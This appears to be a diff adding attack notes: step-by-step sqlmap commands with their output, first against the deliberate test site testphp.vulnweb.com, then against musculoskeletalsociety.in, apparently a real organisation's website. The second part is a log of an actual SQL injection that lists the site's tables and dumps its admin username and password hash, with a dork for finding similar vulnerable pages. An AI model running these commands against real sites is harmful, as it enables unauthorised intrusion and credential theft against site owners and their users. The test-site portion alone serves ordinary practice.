@@ -1,0 +1,228 @@
+Target Website: http://testphp.vulnweb.com
+Search: site:http://testphp.vulnweb.com /php?id=
+Terget Link: http://testphp.vulnweb.com/artists.php?artist=2
+
+2. command: sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=2" --dbs
+3. command: python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=2" --dbs
+3. command: sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --dbs
+3. command: python sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --dbs
+
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+<!-- Database table names checks -->
+
+4. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+<!-- Table users details checks -->
+
+5. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+6. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C address --dump
+Database: acuart
+Table: users
+[1 entry]
++-----------+
+| address   |
++-----------+
+| 21 street |
++-----------+
+
+
+7. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C cc --dump
+Database: acuart
+Table: users
+[1 entry]
++---------------------+
+| cc                  |
++---------------------+
+| 1234-5678-2300-9000 |
++---------------------+
+
+8. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C email --dump
+Database: acuart
+Table: users
+[1 entry]
++-----------------+
+| email           |
++-----------------+
+| email@email.com |
++-----------------+
+
+9. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C name --dump
+Database: acuart
+Table: users
+[1 entry]
++------------+
+| name       |
++------------+
+| John Smith |
++------------+
+
+10. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C phone --dump
+Database: acuart
+Table: users
+[1 entry]
++---------+
+| phone   |
++---------+
+| 2323345 |
++---------+
+
+11. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
+Database: acuart
+Table: users
+[1 entry]
++-------+
+| uname |
++-------+
+| test  |
++-------+
+
+12. command: sqlmap.py -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump
+Database: acuart
+Table: users
+[1 entry]
++------+
+| pass |
++------+
+| test |
++------+
+
+
+
+Youtuber By Adnan Habib 
+Link: https://www.binarytides.com/sqlmap-hacking-tutorial/
+
+
+<!-- Website Details http://musculoskeletalsociety.in  -->
+
+Target Website: http://musculoskeletalsociety.in
+Search: site:http://musculoskeletalsociety.in /php?id=
+Terget Link: http://musculoskeletalsociety.in/page.php?id=5
+1. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 --dbs
+available databases [2]:
+[*] culosmus_muscul
+[*] information_schema
+
+2. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul --tables
+Database: culosmus_muscul
+[24 tables]
++--------------+
+| admin        |
+| caseofmonth  |
+| category     |
+| delegates    |
+| documents    |
+| faculty      |
+| gallery      |
+| homepageimg  |
+| img_category |
+| imggal       |
+| imguploads   |
+| ipadd        |
+| loginip      |
+| message      |
+| news         |
+| newsletter   |
+| page         |
+| pages        |
+| photo        |
+| quicklinks   |
+| slider       |
+| socialmedia  |
+| testimonials |
+| videos       |
++--------------+
+
+
+3. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin --columns
+Database: culosmus_muscul
+Table: admin
+[5 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| entry_id | int(11)     |
+| password | varchar(50) |
+| status   | int(11)     |
+| type     | int(11)     |
+| user_id  | varchar(50) |
++----------+-------------+
+
+4. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin -C user_id --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++---------+
+| user_id |
++---------+
+| admin   |
++---------+
+
+5. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin -C password --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++----------------------------------+
+| password                         |
++----------------------------------+
+| 25a41cec631264f04815eda23dc6edd9 |
++----------------------------------+
+
+6. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin -C status --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++--------+
+| status |
++--------+
+| 1      |
++--------+
+
+7. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin -C type --dump
+Database: culosmus_muscul
+Table: admin
+[1 entry]
++------+
+| type |
++------+
+| 0    |
++------+
+
+7. command: sqlmap.py -u http://musculoskeletalsociety.in/page.php?id=5 -D culosmus_muscul -T admin -C entry_id --dump
+Table: admin
+[1 entry]
++----------+
+| entry_id |
++----------+
+| 1        |
++----------+
